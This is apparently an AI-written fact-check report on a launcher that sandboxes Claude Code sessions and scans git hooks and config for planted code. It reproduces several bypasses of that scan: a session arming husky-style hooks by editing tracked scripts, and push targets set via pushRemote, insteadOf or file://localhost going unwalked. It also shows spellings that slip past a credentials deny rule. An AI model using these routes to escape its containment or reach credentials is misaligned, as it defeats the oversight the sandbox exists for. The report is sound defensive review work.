Commit: 02d14b0

# Code Fact-Check Report

**Repository:** /workspace (branch integrate/q076-q080)
**Scope:** `git diff main...HEAD -- . ':!skills'` at 02d14b0 (pass 1, iteration 2), plus the commit messages of d9a895d, a958372, df11830 and 376a8a2. Replicate r3.
**Checked:** 2026-09-27
**Total claims checked:** 45
**Summary:** 34 verified, 5 mostly accurate, 0 stale, 5 incorrect, 1 unverifiable

Execution provenance: every probe ran in a scratch clone of /workspace checked out at 02d14b0 (`$R/x`), where `$R` = `/tmp/claude-1000/-workspace/dbfd30e0-d8d5-40c1-8bac-572239fc44fd/scratchpad/iter2-r3`. Logs are under `$R/probes/`; each log ends with its exit code, timestamp and cwd. The environment was git 2.39.5, bash 5.2.15 and uid 1000 (non-root, so the chmod-based probes are meaningful). /workspace was not modified apart from this report.

**Iteration-1 Incorrect claims, re-run against 02d14b0** (`$R/probes/iter1-repros.sh` → `iter1-repros.log`, exit 0, 2026-09-27T15:44:57-07:00):

| Iter-1 claim | Reproduction | Now |
|---|---|---|
| 2, 5, 18, 24 | X3: `core.fsmonitor` in `.git/modules/sub/config` | scan rc 1, named and marked |
| 2, 5, 18, 21 | X4: `remote.origin.receivepack` | scan rc 1, named and marked |
| 2, 9, 18, 21 | X6: hook in a 0111 hooks dir | scan rc 2 (fail closed) |
| 2, 18 | X7: `pushurl` repointed to a session-built bare repo with a hook | scan rc 1, remote dir and its config named |
| 64 | ESC in an unreadable hook name at launch | raw snapshot stderr holds ESC; `main` pipes it through `scan_vis` (bats `(f)` launch test passes) |

All five are resolved. The redesign introduced new gaps, reported below as Claims 2b, 7, 19b and 21. The gap that matters most is a hook present at launch that runs a tracked script. That is husky's default layout (`core.hooksPath=.husky/_`), and a session can arm it by editing a normal tracked file while the launcher exits 0.

---

## Claim 1: "Generated eval reports are committed (Q-071 [1]): the report and every sidecar the suites read to grade it (.stamp freshness, .failed marker, .transcript.jsonl for tool-call checks). Anything else a run might leave in output/ stays ignored."

**Location:** `.gitignore:4-12`
**Type:** Configuration
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the ignore status of the four sidecar suffixes and of other files directly under `output/`. It does not establish that any report is committed today: `git ls-files 'test/skills/*/output/*'` prints 0 lines. The opening "are committed" is policy. (The same wording was rated Mostly accurate in iteration 1 and fixed elsewhere in 376a8a2.)
**Legibility-target:** for-orchestrator-synthesis

The rules are `test/skills/*/output/*` followed by `!test/skills/*/output/*.report.md`, `!…*.stamp`, `!…*.failed` and `!…*.transcript.jsonl` (`.gitignore:8-12`). Running `git check-ignore -q --no-index test/skills/code-review/output/tc-x.<suffix>` returned 1 (not ignored) for all four suffixes. The suite test `stamp: reports and every sidecar the suites read are tracked, not gitignored` asserts that `scratch.tmp` is ignored, and it passes (32/32).

**Evidence:** `.gitignore:4-12`; `$R/probes/eval-helpers-freshness.bats.log` (bats test/skills/eval-helpers-freshness.bats, cwd `$R/x`, rc 0, 2026-09-27T15:48:57-07:00); the check-ignore run was inline in the same command. Its output: `report.md ignored-rc=1 … transcript.jsonl ignored-rc=1`, and `git ls-files` printed 0.

---

## Claim 2a: "main() snapshots every file host git reads to decide what to run … anything added, removed or changed is named, and the launcher exits 3 instead of 0." (the iteration-1 bypasses)

**Location:** `devcontainer-config/cc-isolated.sh:542-545`
**Type:** Behavioral / Invariant
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the four iteration-1 plants (submodule-gitdir fsmonitor, receivepack, unlistable hooks dir, repointed pushurl), which now give scan status 1 or 2. It also covers the 125 cases in the suite and exit 3 through `main` (bats `a launch whose session plants a hook exits 3`). It does not establish the universal "every file". Claim 2b refutes that for remote forms present at launch, and Claim 7 covers hook-invoked tracked files.
**Legibility-target:** for-orchestrator-synthesis

```bash
# devcontainer-config/cc-isolated.sh:1152-1157
  git_exit_scan "$ws" "$git_before" || scan=$?
  case "$scan" in
    0) exit "$rc" ;;
    1) exit 3 ;;   # the session planted something: never a clean exit
    *) exit 4 ;;   # the scan could not read .git
  esac
```
(excerpt ends :1157; enclosing main() continues to :1158 — read)

The re-run results are in the table at the top. `bats test/cc-isolated-functions.bats` passed 125/125.

**Evidence:** `devcontainer-config/cc-isolated.sh:537-545`, `devcontainer-config/cc-isolated.sh:874-913`, `devcontainer-config/cc-isolated.sh:1143-1158`; `$R/probes/iter1-repros.log`; `$R/cc-bats.log` (bats test/cc-isolated-functions.bats, cwd `$R/x`, rc 0, run 2026-09-27 ~15:43 local)

---

## Claim 2b: "snapshots every file host git reads to decide what to run" (universality)

**Location:** `devcontainer-config/cc-isolated.sh:542-543`
**Type:** Invariant
**Verdict:** Incorrect
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers three reproduced cases. In each, a push target's hooks are read and run by a host `git push`, but they sit in a bare repo inside the checkout that the scan never walks, so a hook the session plants there leaves the scan at rc 0. All three need a remote setting that was already present at launch, so they are low-likelihood. The verdict does not rate that likelihood. It does not cover the hook-to-tracked-script case, which is Claim 7.
**Legibility-target:** for-author

Only `remote.*.url` and `remote.*.pushurl` values are passed to `_snap_remote`:

```bash
# devcontainer-config/cc-isolated.sh:786-787
      remote.*.url|remote.*.pushurl)
        _snap_remote "$val" || return 1 ;;
```

`_snap_remote` strips `file://` and then treats anything that does not start with `/`, `./` or `../` as relative to the checkout:

```bash
# devcontainer-config/cc-isolated.sh:743-749
  case "$p" in
    file://*) p="${p#file://}" ;;
    /*|./*|../*) ;;
    *:*|"") return 0 ;;
  esac
  case "$p" in /*) ;; *) p="$_snap_ws/$p" ;; esac
  _snap_inside_ws "$p" || return 0
```
(excerpt ends :749; enclosing _snap_remote() continues to :757 — read)

Reproduced, each with the setting present at launch (`$R/probes/new-bypass.sh` → `new-bypass.log`, exit 0, 2026-09-27T15:45:21-07:00):
- **N2.** `branch.<b>.pushRemote=./bare.git`, then a session-planted `bare.git/hooks/post-receive`: scan rc 0, and a plain host `git push` ran it.
- **N3.** `url.<ws>/mirror.git.insteadOf=https://…` rewriting origin, then a hook planted in `mirror.git`: scan rc 0, and the push ran it.
- **N6.** `remote.origin.url=file://localhost<ws>/lh.git`: `_snap_remote` resolved it to the nonexistent `<ws>/localhost<ws>/lh.git`, so the real repo was never walked. Scan rc 0, and the push ran the planted hook.

A relative url without `./` (`bare2.git`) **is** walked (N4: scan rc 1). The header comment's own `Notes` in d9a895d names `branch.*.pushRemote` as able to "name a local path whose hooks a push runs", but only as a reason to report every config change. The target is not walked.

**Evidence:** `devcontainer-config/cc-isolated.sh:741-757`, `devcontainer-config/cc-isolated.sh:760-792`; `$R/probes/new-bypass.log` (N2, N3, N4, N6)

---

## Claim 3: "any local-path remote (url/pushurl) inside the checkout, walked as a git dir (a push to it runs its hooks)"

**Location:** `devcontainer-config/cc-isolated.sh:558-559`
**Type:** Behavioral
**Verdict:** Mostly accurate
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers `./x`, `../x`, `/abs`, `file:///abs` and bare-relative url/pushurl values (walked; X7 and N4 flagged). It does not cover `file://localhost/abs`, which is a local url that is not walked (N6), or remote targets named outside url/pushurl (Claim 2b).
**Legibility-target:** for-author

The claim is accurate as scoped. The precise version is "a url/pushurl that is a plain path or `file:///path`". The `file://*` branch at `:744` strips only the scheme, so `file://localhost/…` becomes a path relative to the checkout (quoted in Claim 2b).

**Evidence:** `devcontainer-config/cc-isolated.sh:741-757`; `$R/probes/new-bypass.log` (N4, N6), `$R/probes/iter1-repros.log` (X7)

---

## Claim 4: "FAIL CLOSED. A directory that cannot be listed, a file that cannot be read or a config git cannot parse makes the snapshot fail: at launch the launcher refuses to start, at exit it returns 4."

**Location:** `devcontainer-config/cc-isolated.sh:566-569`
**Type:** Error-handling
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers these cases: an unparseable module config (F1), an unreadable `config.worktree` (F2), an unlistable directory anywhere in the working tree (F3), an unreadable hook in a module hooks dir (F9) and a 0111 hooks dir (X6). Each gives `git_exit_scan` status 2, which `main` maps to 4. The launch refusal is covered by the bats tests `(d) … refuses the baseline` and `a launch refuses to start when .git cannot be snapshotted`. It does not establish that the scan terminates if a process still running in the container swaps a regular file for a FIFO between the `-f` test and the read. That would hang the scan, not pass it; see Claim 6.
**Legibility-target:** for-orchestrator-synthesis

```bash
# devcontainer-config/cc-isolated.sh:681-685
  if ! find -P "$@" -print0 > "$out" 2> "$out.err"; then
    printf 'cannot list everything under %s: %s\n' "$1" "$(tr '\n' ' ' < "$out.err")" >&2
    return 1
  fi
```
(excerpt ends :685; enclosing _snap_find() continues to :686 — read)

Measured: F1, F2, F3 and F9 each returned `scan rc=2`. F3 means any unlistable directory in the working tree also blocks the launch. d9a895d's Notes describe that as deliberate.

**Evidence:** `devcontainer-config/cc-isolated.sh:632-686`, `devcontainer-config/cc-isolated.sh:765-769`, `devcontainer-config/cc-isolated.sh:1078-1094`; `$R/probes/failclosed.sh` → `failclosed.log` (exit 0, 2026-09-27T15:46:09-07:00), `$R/cc-bats.log`

---

## Claim 5: "THE SCAN RUNS NOTHING FROM THE REPO … Config is read with `git config --file <f> --no-includes` from cwd /, so no repo is discovered … Everything else is find, stat, readlink and sha256sum"

**Location:** `devcontainer-config/cc-isolated.sh:571-578`
**Type:** Invariant
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers `git_exec_snapshot`, including the `_snap_*` helpers and `scan_git_dirs`. A PATH-shimmed `git` logged exactly four calls, all with cwd `/`: three `config --file … --no-includes --null --list` and one `config --null --list` (the host's own config, read without `--no-includes`). No marker fired, even with fsmonitor, a filter plus attributes, a hook, an include, a submodule, a worktree and hooksPath all planted. It does not cover `_snap_worktree_of`'s `git config --file … --get core.worktree`, which is also from `/` and only reached for module configs. It also does not cover the helper tools the comment omits (`realpath`, `dirname`, `mktemp`, `sort`, `awk`), none of which execute repo content. The launcher's other git calls at launch (`resolve_workspace`, `ws_fingerprint`) are not covered either.
**Legibility-target:** for-orchestrator-synthesis

```bash
# devcontainer-config/cc-isolated.sh:766
  if ! (cd / && git --no-pager config --file "$f" --no-includes --null --list) > "$out" 2> "$out.err"; then
```

The spy log shows `cwd=/ argv=--no-pager config --file $T/ws/.git/config --no-includes --null --list`, the same for `.git/inc` and `.git/modules/sub/config`, and `cwd=/ argv=--no-pager config --null --list`. It ended with `markers: []`.

**Evidence:** `devcontainer-config/cc-isolated.sh:598-622`, `devcontainer-config/cc-isolated.sh:724-737`, `devcontainer-config/cc-isolated.sh:760-815`; `$R/probes/spy.sh` → `spy.log` (exit 0, 2026-09-27T15:45:54-07:00)

---

## Claim 6: "find never follows symlinks (-P), and a symlink's target is hashed only when it is a regular file."

**Location:** `devcontainer-config/cc-isolated.sh:575-577`
**Type:** Invariant
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers a hook symlinked to a FIFO (F4), a FIFO `config.worktree` (F5), a FIFO include target (F6), a FIFO `commondir` (F7), a FIFO embedded `sub/.git` (F8) and `config.worktree -> /dev/zero` (F10). All finished within the 20 s watchdog with scan rc 1; none hung. Symlinked directories are followed by design: `_snap_file` sets `_snap_linkdir` and the callers walk it (`:653-655`, `:833-835`). The verdict does not cover a regular file being swapped for a FIFO mid-scan by a process that outlives claude, which the documented "After the scan" limit already concedes.
**Legibility-target:** for-orchestrator-synthesis

```bash
# devcontainer-config/cc-isolated.sh:646-652
  if [ -L "$p" ]; then
    t="$(readlink -- "$p")" || { printf 'cannot read link %s\n' "$p" >&2; return 1; }
    attrs="link -> $(printf '%q' "$t")"
    if [ -f "$p" ]; then
      h="$(_snap_hash "$p")" || return 1
      attrs+=" file $h"
    elif [ -d "$p" ]; then
```
(excerpt ends :652; enclosing _snap_file() continues to :676 — read)

**Evidence:** `devcontainer-config/cc-isolated.sh:640-676`; `$R/probes/failclosed.log` (F4–F8, F10)

---

## Claim 7: "LIMITS … The container keeps running after claude exits … Whatever is present at launch is the baseline … A launcher killed before the scan … scans nothing. A config value that names a program by path inside the checkout … is recorded as a value, not followed"

**Location:** `devcontainer-config/cc-isolated.sh:583-589`
**Type:** Behavioral
**Verdict:** Incorrect
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the completeness of the limits list. It omits a hook present at launch that executes a tracked file in the checkout. The session edits the tracked file, the hook's own hash is unchanged, the launcher exits 0, and the host runs the session's code. The listed limits themselves are accurate.
**Legibility-target:** for-author

Reproduced three ways:
- **N1.** `.git/hooks/pre-push` runs `exec "$(git rev-parse --show-toplevel)/scripts/check.sh"`. The session rewrote `scripts/check.sh`: scan rc 0, and a host `git push` ran it.
- **N1b.** Husky's layout: `core.hooksPath=.husky/_` with a wrapper sourcing `.husky/pre-commit`. The session edited `.husky/pre-commit`: scan rc 0, and a host `git commit` ran it.
- **N1-main.** Through `main` with the stubbed devcontainer CLI: `launcher status=0`, then a host `git commit` printed `PLANTED-RAN`.

The one limit that comes close covers only config values ("A config value that names a program by path", `:587-589`). The guide's version of the same limit says hooks are "the exception" (Claim 21). Husky, lefthook and the pre-commit framework all ship this shape. The fetch-only separate-clone advice is unaffected (Claim 22).

**Evidence:** `devcontainer-config/cc-isolated.sh:583-589`, `devcontainer-config/cc-isolated.sh:707-722`; `$R/probes/new-bypass.log` (N1, N1b); `$R/probes/int2.bats` → `int2.log` (rc 1 by design, 2026-09-27 ~15:53 local; test 3 prints `launcher status=0` and `host commit ran the session-edited script`)

---

## Claim 8: "EVERY CONTAINER-CHOSEN STRING (names, values, error text) reaches the terminal only through scan_vis, at launch and at exit."

**Location:** `devcontainer-config/cc-isolated.sh:580-581`
**Type:** Invariant
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the launch-refusal block, both `git_exit_scan` warnings and the diff lines. It does not cover strings the host chooses (`$ws` in the `Project:` line) or output from `devcontainer` or claude.
**Legibility-target:** for-orchestrator-synthesis

```bash
# devcontainer-config/cc-isolated.sh:1081-1087
    if ! git_before="$(git_exec_snapshot "$ws" 2>"$snap_err")"; then
      {
        echo "ERROR: could not snapshot $ws/.git for the session-exit scan: $(cat "$snap_err")"
        ...
      } | scan_vis >&2
```
(excerpt ends :1087; enclosing if-block continues to :1092 — read)

The raw snapshot stderr for an ESC-named unreadable hook contains ESC (`raw stderr contains ESC? 1`). The launch path pipes it through `scan_vis`, and the bats tests `(f) … at exit` and `(f) … at launch` assert that `?` appears and ESC does not. Both pass.

**Evidence:** `devcontainer-config/cc-isolated.sh:916-919`, `devcontainer-config/cc-isolated.sh:945-984`, `devcontainer-config/cc-isolated.sh:1078-1094`; `$R/probes/iter1-repros.log` (C64), `$R/cc-bats.log`

---

## Claim 9: "The key list below only labels report lines."

**Location:** `devcontainer-config/cc-isolated.sh:564`
**Type:** Architectural
**Verdict:** Verified
**Confidence:** High
**Verification mode:** static
**Scope:** Covers every use of `GIT_EXIT_SCAN_KEYS_RE` in cc-isolated.sh. It does not cover the bats pin against install.sh, which passes (test 123).
**Legibility-target:** for-orchestrator-synthesis

The only use is the `note()` label in `scan_diff`: `function note(key) { return (tolower(key) ~ ENVIRON["SCAN_KEYS_RE"]) ? "   <- can run a program" : "" }` (`devcontainer-config/cc-isolated.sh:925`). Detection compares the full snapshots (`[ "$before" != "$after" ] || return 0`, `:961`).

**Evidence:** `devcontainer-config/cc-isolated.sh:594`, `devcontainer-config/cc-isolated.sh:924-925`, `devcontainer-config/cc-isolated.sh:961`

---

## Claim 10: "SIZE. This block brings cc-isolated.sh to about 1160 lines."

**Location:** `devcontainer-config/cc-isolated.sh:591`
**Type:** Configuration
**Verdict:** Verified
**Confidence:** High
**Verification mode:** static
**Scope:** Covers the line count at 02d14b0. It does not cover the PAYLOAD rationale.
**Legibility-target:** for-orchestrator-synthesis

`wc -l devcontainer-config/cc-isolated.sh` reports 1163 (paraphrased — no quote available because the claim is about file length, not a snippet).

**Evidence:** `devcontainer-config/cc-isolated.sh:1-1163`

---

## Claim 11: "git_exit_scan <ws> <launch snapshot>: 0 when nothing host git reads to decide what to run changed; 1 … when something did; 2 when the exit state could not be read."

**Location:** `devcontainer-config/cc-isolated.sh:942-944`
**Type:** Behavioral
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the return codes (probes plus bats). It does not establish the "0 when nothing … changed" direction for items the snapshot does not record (Claims 2b and 7). It also does not cover the accuracy of the rc 2 warning text, which is Claim 12.
**Legibility-target:** for-orchestrator-synthesis

Each return path appears in the code: `return 2` after a failed snapshot (`:958`), `[ "$before" != "$after" ] || return 0` (`:961`), and `return 1` after the warning (`:983`). The probes produced all three codes.

**Evidence:** `devcontainer-config/cc-isolated.sh:945-984`; `$R/probes/iter1-repros.log`, `$R/probes/failclosed.log`

---

## Claim 12: "WARNING: the exit scan could not read everything under $ws/.git: $reason"

**Location:** `devcontainer-config/cc-isolated.sh:952`
**Type:** Error-handling
**Verdict:** Mostly accurate
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the message's location wording. It does not affect the exit code, which is 4 either way.
**Legibility-target:** for-author

The scan also lists the whole working tree (`_snap_find "$list" "$_snap_ws" -mindepth 2 -name .git`, `:901`), so the failure can be outside `.git`. For F3 the message read "could not read everything under …/ws/.git: cannot list everything under …/ws: find: '…/ws/deep': Permission denied". The reason text names the real path, so the prefix is imprecise but not misleading. The precise version is "under $ws".

**Evidence:** `devcontainer-config/cc-isolated.sh:899-907`, `devcontainer-config/cc-isolated.sh:952`; `$R/probes/failclosed.log` (F3)

---

## Claim 13: "Safest: push from a separate host clone that fetches from this one; a fetch runs none of this checkout's hooks, fsmonitor, filters or remote settings. `git -c core.hooksPath=/dev/null -c core.fsmonitor=false push` covers hooks and fsmonitor ONLY: not remote.*.receivepack, a repointed remote, filters, includes, credential helpers or core.sshCommand."

**Location:** `devcontainer-config/cc-isolated.sh:972-977`
**Type:** Behavioral
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers git 2.39.5. With a checkout planted with 8 hooks, fsmonitor, clean/smudge/process filters with attributes, sshCommand, gitProxy, `uploadpack.packObjectsHook`, `core.alternateRefsCommand`, receivepack, uploadpack, a credential helper and a pager, a separate clone's `git fetch`, `merge` and `push`, plus a fresh `git clone`, fired no marker. The hooks-only push still ran receivepack (X4). It does not cover a separate clone whose *own* hooks run tracked files that the fetch brings in (Claim 22 scope), or other git versions.
**Legibility-target:** for-orchestrator-synthesis

The script prints `fetch rc=0`, `merge rc=0`, `push rc=0`, `clone rc=0` and `markers: []`. That iteration-1 Claim 12 (Mostly accurate: receivepack and credential helpers missing from the list) is fixed can be seen in the text `not remote.*.receivepack, a repointed remote, filters, includes, credential helpers or core.sshCommand` (`devcontainer-config/cc-isolated.sh:975-976`).

**Evidence:** `devcontainer-config/cc-isolated.sh:972-977`; `$R/probes/sepclone2.sh` → `sepclone2.log` (exit 0, 2026-09-27T15:46:34-07:00, git 2.39.5), `$R/probes/iter1-repros.log` (X4)

---

## Claim 14: "Not `exec`: the launcher has to outlive claude to run the exit scan. The INT trap keeps a Ctrl-C that ends the session from also killing the launcher before the scan … so claude still gets its own Ctrl-C"

**Location:** `devcontainer-config/cc-isolated.sh:1143-1146`
**Type:** Behavioral
**Verdict:** Verified
**Confidence:** Medium
**Verification mode:** executed
**Scope:** Covers the launcher surviving a process-group SIGINT and still scanning (X9: exit 3 after a planted hook), and the child's 130 passing through when nothing is planted (X10). Both use the stubbed devcontainer CLI. It does not establish that a real `devcontainer exec … claude` delivers Ctrl-C to claude; that needs a live container.
**Legibility-target:** for-orchestrator-synthesis

```bash
# devcontainer-config/cc-isolated.sh:1147-1150
  local rc=0
  trap ':' INT
  devcontainer exec "${dc[@]}" claude || rc=$?
  trap - INT
```
(excerpt ends :1150; enclosing main() continues to :1158 — read)

**Evidence:** `devcontainer-config/cc-isolated.sh:1143-1158`; `$R/probes/int2.log` (tests 1–2: `ok 1 X9 …`; X10 `status=130`)

---

## Claim 15: Decision log row 53 amendment: "The image has no bwrap or socat and the container refuses unprivileged user namespaces (`unshare -Ur` → EPERM) … `hooks/wiring.json` adds `Bash(*.credentials.json*)`, and the hook reads Bash deny rules itself and never approves a match … a spelling without the literal name (`.cred""entials.json`, a glob such as `.cred*`, a variable whose value is not spelled out in the same command) still gets through; each of those three spellings is pinned by a test. In a deny rule only `*` is a wildcard, and a bare `Bash` deny rule blocks all approval."

**Location:** `docs/decisions/log.md:76`
**Type:** Behavioral / Configuration
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the hook's behaviour (probes plus 21/21 bats), the three pinned spellings and the sandbox facts as measured in this review sandbox. The sandbox is a devcontainer and may not be byte-identical to a freshly built cc-isolated image. It does not cover the #39344 clause, which is Claim 27.
**Legibility-target:** for-orchestrator-synthesis

The sandbox check `command -v bwrap socat` printed nothing, and `unshare -Ur true` gave `unshare: unshare failed: Operation not permitted`. The hook probes: the literal credentials path in `$(( ))` falls through. `.cred""entials.json` and `~/.claude/.c*` get ALLOW. `Bash`, `Bash(*)` and `Bash(**)` deny rules all fall through on `ls`. The three spellings are pinned by tests at `test/auto-approve-allowed-commands.bats:179`, `:189` and `:197`, and the test at `:120` pins the gap when no deny rule exists. Iteration-1 Claims 30 and 32 are resolved.

**Evidence:** `docs/decisions/log.md:76`, `test/auto-approve-allowed-commands.bats:120-245`; `$R/probes/hookprobe2.sh` → `hookprobe2.log` (exit 0, 2026-09-27T15:48:06-07:00; the sandbox commands ran in the same invocation), `$R/aa-bats.log` (bats test/auto-approve-allowed-commands.bats, cwd `$R/x`, rc 0, 21 ok)

---

## Claim 16: "It never approves a command that matches a `Bash(...)` deny rule, so the wired `Bash(*.credentials.json*)` backstops the credentials file where no sandbox runs … In a deny rule only `*` is a wildcard, and a bare `Bash` rule denies every command."

**Location:** `guides/bare-host-hook-wiring.md:151-156`
**Type:** Behavioral
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the hook's decisions (Claim 15 probes: `notes[1]`, `?`, extglob `+(a|b)`, non-ASCII `café` and a backslash all match literally, in both the C and C.UTF-8 locales). It does not cover Claude Code's own evaluation of the same rules.
**Legibility-target:** for-orchestrator-synthesis

The guide's statement is backed by `if matches_deny "$command" deny_globs; then … exit 0` (`hooks/auto-approve-allowed-commands.sh:264-267`) and the per-extracted-command check at `:313-316`. Iteration-1 Claim 27 is resolved.

**Evidence:** `guides/bare-host-hook-wiring.md:148-156`, `hooks/auto-approve-allowed-commands.sh:113-167`, `hooks/auto-approve-allowed-commands.sh:260-332`; `$R/probes/hookprobe2.log`

---

## Claim 17: "Before step 4 the launcher snapshots every file host git reads to decide what to run … when claude exits it compares, and exits **3** naming anything the session added, removed or changed … It exits 4 when the exit scan cannot list or read any of it, and refuses to launch when the baseline snapshot cannot be taken."

**Location:** `guides/cc-isolated-usage.md:50-57`
**Type:** Behavioral
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the ordering (the snapshot at `cc-isolated.sh:1078-1094` comes before `devcontainer up` at `:1110`) and the 0/3/4 plus refusal contract. It does not cover the "every file" universality (Claims 2b and 19b). The 3 and 4 codes also overlap with claude's own exit codes, which pass through on a clean scan (`0) exit "$rc"`).
**Legibility-target:** for-orchestrator-synthesis

```bash
# devcontainer-config/cc-isolated.sh:1153-1156
  case "$scan" in
    0) exit "$rc" ;;
    1) exit 3 ;;   # the session planted something: never a clean exit
    *) exit 4 ;;   # the scan could not read .git
```
(excerpt ends :1156; enclosing case continues to :1157 — read)

**Evidence:** `guides/cc-isolated-usage.md:50-57`, `devcontainer-config/cc-isolated.sh:1078-1158`; `$R/cc-bats.log` (tests 124–125)

---

## Claim 18: "A plain host `git push` (or `git status`) runs any hooks, `core.fsmonitor`, filter drivers, `remote.*.receivepack` command or repointed remote planted there, as you and with your keys."

**Location:** `guides/cc-isolated-usage.md:165-168`
**Type:** Behavioral
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the listed vectors as each is triggered by some host git command (status → fsmonitor, commit → hooks, push → receivepack and repointed pushurl). It does not claim that every vector fires on both push and status.
**Legibility-target:** for-orchestrator-synthesis

The harness in `$R/probes/iter1-repros.sh` runs the host command after each scan and shows the markers `fsmon-sub`, `receivepack`, `post-commit` and `post-receive`. (paraphrased — no quote available because the evidence is captured probe output, not source)

**Evidence:** `guides/cc-isolated-usage.md:165-169`; `$R/probes/iter1-repros.log`

---

## Claim 19a: The coverage list: "every `config`, `config.worktree` and `commondir` file, `info/attributes`, every hooks dir and hook (except `*.sample`) and every symlink in the git dir and common dir, recursively through `.git/modules/**` and `.git/worktrees/*`; every embedded repo's `.git` … the `core.hooksPath` dirs, `include.path`/`includeIf` targets and `core.attributesFile` those configs name, and the ones your own global config names"

**Location:** `guides/cc-isolated-usage.md:175-182`
**Type:** Behavioral
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers each listed item via the bats `(a)`–`(f)` cases (125/125). It also covers git's resolution of a relative *global* `core.hooksPath` and `core.attributesFile` inside the checkout, even from a subdirectory: a probe showed git 2.39.5 ran both. The "local-path remote" item is qualified in Claim 3. The universal lead-in is Claim 19b.
**Legibility-target:** for-orchestrator-synthesis

```bash
# devcontainer-config/cc-isolated.sh:822-824
  _snap_find "$list" "$real" \( -type l -o -name config -o -name config.worktree \
    -o -name commondir -o -path '*/info/attributes' -o -name hooks -o -path '*/hooks/*' \) \
    ! -name '*.sample' || return 1
```
(excerpt ends :824; enclosing _snap_gitdir() continues to :851 — read)

**Evidence:** `devcontainer-config/cc-isolated.sh:796-851`, `devcontainer-config/cc-isolated.sh:874-913`; `$R/cc-bats.log`; `$R/probes/globalrel.sh` → `globalrel.log` (exit 0, 2026-09-27T15:53:13-07:00: `markers: [global-rel-attr global-rel-hook ]`)

---

## Claim 19b: "`cc-isolated` snapshots, before the session, every file host git reads to decide what to run"

**Location:** `guides/cc-isolated-usage.md:170-172`
**Type:** Invariant
**Verdict:** Incorrect
**Confidence:** High
**Verification mode:** executed
**Scope:** The same three reproduced gaps as Claim 2b: hooks of an in-checkout push target named via `branch.*.pushRemote`, `url.*.insteadOf` or `file://localhost/…`, which host `git push` reads and runs but the scan never walks. All need the setting to be present at launch. It does not cover hook-invoked tracked files (Claim 21).
**Legibility-target:** for-author

See Claim 2b for the code (`_snap_remote` is only reached from `remote.*.url|remote.*.pushurl`, `devcontainer-config/cc-isolated.sh:786-787`) and the reproductions N2, N3 and N6.

**Evidence:** `guides/cc-isolated-usage.md:170-182`, `devcontainer-config/cc-isolated.sh:741-792`; `$R/probes/new-bypass.log`

---

## Claim 20: "It fails closed … The scan runs nothing from the checkout: it finds the git dir by reading files, reads config with `git config --file … --no-includes` from `/`, and otherwise only uses `find` (never following symlinks), `stat`, `readlink` and `sha256sum`. Every name, value and error it prints goes through a filter that shows control bytes as `?`."

**Location:** `guides/cc-isolated-usage.md:185-193`
**Type:** Invariant / Error-handling
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** The same coverage and residue as Claims 4, 5, 6 and 8. In particular, the host's own config is read with `git config --null --list` (includes followed, host files only), and helper tools such as `realpath` and `awk` are not listed.
**Legibility-target:** for-orchestrator-synthesis

See the spy log (four git calls, all from `/`, no markers) and the FIFO and unreadable probes. (paraphrased — no quote available because the verdict rests on the evidence already quoted in Claims 4–6 and 8)

**Evidence:** `guides/cc-isolated-usage.md:185-193`; `$R/probes/spy.log`, `$R/probes/failclosed.log`, `$R/cc-bats.log`

---

## Claim 21: "Its limits: … **Outside `.git`.** Tracked files such as `.gitattributes` are not scanned; a tracked attribute only runs a driver that config defines, and that config is scanned. **Programs named by path.** … Hooks, hooks dirs, includes and attribute files are the exception: their contents are hashed."

**Location:** `guides/cc-isolated-usage.md:193-209`
**Type:** Behavioral
**Verdict:** Incorrect
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the completeness of the limits list and the "exception" sentence. A hook present at launch that runs a tracked file is armed by editing that file with no finding (N1, N1b, N1-main exit 0). "Their contents are hashed" is literally true of the hook, but presenting hooks as the safe exception misleads. It also covers the secondary point that a tracked attribute can select a driver defined in the host's global or system config, whose entries the scan does not record. That config is not container-writable, so this part is harmless. The Baseline, After-the-scan and No-scan limits are accurate (X9 covers the Ctrl-C sentence).
**Legibility-target:** for-author

The reproductions are in Claim 7. The husky layout (`core.hooksPath=.husky/_`, wrapper sourcing `.husky/pre-commit`) is the common real-world instance, and there a session needs to make no change to `.git` at all.

**Evidence:** `guides/cc-isolated-usage.md:193-209`, `devcontainer-config/cc-isolated.sh:707-722`, `devcontainer-config/cc-isolated.sh:806-815`; `$R/probes/new-bypass.log`, `$R/probes/int2.log`

---

## Claim 22: "push from a separate host clone that fetches from this one: a fetch runs none of this checkout's hooks, fsmonitor, filters or remote settings (checked on git 2.39). `git -c core.hooksPath=/dev/null -c core.fsmonitor=false push` covers hooks and fsmonitor **only**: it still runs a planted `remote.*.receivepack`, pushes to a repointed `remote.*.url`/`pushurl` (whose hooks then run), and uses planted filters, includes, credential helpers and `core.sshCommand`."

**Location:** `guides/cc-isolated-usage.md:210-216`
**Type:** Behavioral
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the same evidence as Claim 13, on git 2.39.5. It does not establish that the separate clone is safe once it has *merged* the session's commits. If that clone has its own hooks that run tracked files (for example, husky installed there by `npm install`), the fetched content runs on the next commit or push from it. The guide does not say so.
**Legibility-target:** for-author

`sepclone2.log`: `markers: []` after fetch, merge, push and a fresh clone. X4 shows receivepack firing under the hooks-only `-c` push. (paraphrased — no quote available because the evidence is probe output)

**Evidence:** `guides/cc-isolated-usage.md:210-216`; `$R/probes/sepclone2.log`, `$R/probes/iter1-repros.log`

---

